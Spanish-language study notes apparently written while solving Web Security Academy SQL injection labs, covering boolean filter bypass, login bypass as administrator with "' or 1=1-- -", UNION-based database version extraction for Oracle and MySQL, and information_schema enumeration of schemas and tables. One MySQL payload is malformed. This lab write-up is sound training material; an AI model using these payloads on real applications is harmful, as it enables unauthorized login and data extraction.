# Inyecciones SQL

## cheatsheet


## Laboratorios

### Reto 1

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Para resolver el laboratorio, realice un ataque de inyección SQL que haga que la aplicación muestre uno o más productos no lanzados.

En la url podemos emplear una vulnerabilidad típica usando las comillas y comentando lo siguiente de esta forma podemos hacerlo:

```bash
https://web-security-academy.net/filter?category=Pets
```
Para explotarla podemos usar `test' or 1=1-- -` donde 1=1 siempre se va a dar  y los guiones posteriores sirven para comentar lo que viene siguiente

```bash
https://web-security-academy.net/filter?category=Pets' or 1=1-- -
```

Obtenemos todos los procutos esten o no lanzados. si quisieramos solo ver los que no estan lanzados , tendriamos que usar esta sentencia:

```bash
https://web-security-academy.net/filter?category=Pets' or released=0-- -
```


### Reto 2

Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión.

Para resolver el laboratorio, realice un ataque de inyección SQL que inicie sesión en la aplicación como administrator usuario.

Para resolver este reto , he realizado un ataque parecido al reto anterior en un panel de login para ello he utilizado lo siguiente:

```bash
User: administrator
passwd: test' or 1=1-- -
```

De esta manera hacemos un bypass del login.

### Reto 3 Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Se puede usar un ataque UNION para recuperar los resultados de una consulta inyectada.

Para resolver el laboratorio, muestre la cadena de versión de la base de datos,  es importante destacar que las sentencias de SQL son distintas para cada base de datos.

Para lograrlo:

- Se intercepta la solicitud que filtra los productos por categoría y se modifica el parámetro ‘category’ hay que tener en cuenta que para extraer datos no nos vale lo anterior que muestra todo.

- Primero se determina cuántas columnas devuelve la consulta y cuáles aceptan datos de tipo texto podemos usar ORDER BY e ir probando en nuestro caso son dos columnas. 
```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

Esto es necesario para que el ataque UNION funcione correctamente, la letras a y b se deberian de mostrar en alguna parte de la página, la tabla `dual` es una tabla especial que tiene oracle de una fila y columna
 para hacer cálculos.

```
https://web-security-academy.net/filter?category=Pets' union select 'a','b' from dual-- -
```

- Una vez identificadas las columnas, se utiliza una inyección que consulta la tabla ‘v$version’, propia de Oracle, para obtener el valor del campo ‘BANNER’, que contiene información sobre la versión de la base de datos.

- Ejemplo de oracle
```
https://web-security-academy.net/filter?category=Pets' union select 'a',banner from v$version-- -
```

-Ejemplo de MySQL y Microsoft

```
https://web-security-academy.net/filter?category=Pets' union select 'a',@@version-- -
```

Otros ejemplos: 

-Extraer las bases de datos que hay en MYSQL

```
https://web-security-academy.net/filter?category=Pets' union select 'a',union select 'a',schema_name from information_schema.schemata-- -
```

Enumerararlas usando `group_concat()`para concatenar todos los nombres en una sola fila y poder verlos todos juntos

```
https://web-security-academy.net/filter?category=' union select NULL,group_concat(schema_name) from information_schema.schemata-- -
```

Enumeramos todas las tablas de todas las bases de datos

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables-- -
```

Enumeramos las tablas de una base de datos en específico por ejemplo 'academy_labs'

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables where table_schema='academy_labs'-- -
```


## ¿Qué es server-side template injection ?

